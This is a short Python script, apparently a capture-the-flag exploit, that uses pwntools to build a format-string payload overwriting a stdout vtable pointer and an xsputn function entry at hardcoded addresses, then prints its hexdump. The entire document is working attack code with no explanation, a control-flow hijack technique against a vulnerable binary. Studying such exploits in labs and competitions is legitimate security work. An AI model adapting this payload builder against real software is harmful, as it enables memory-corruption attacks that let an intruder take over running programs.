from pwn import *
from fmtstr import fmtstr_payload
context(arch='amd64')

def main():
    base = 0x6cd0e0
    xsputn_offset = 56
    stdout_vtable_addr = 0x6cb3d8
    writes = {
        base + xsputn_offset: 0x4b95d8,
        stdout_vtable_addr + 1: 0x6cd0
    }
    payload = fmtstr_payload(offset=6, writes = writes, write_size='short')
    print(hexdump(payload))

if __name__ == "__main__":
    main()
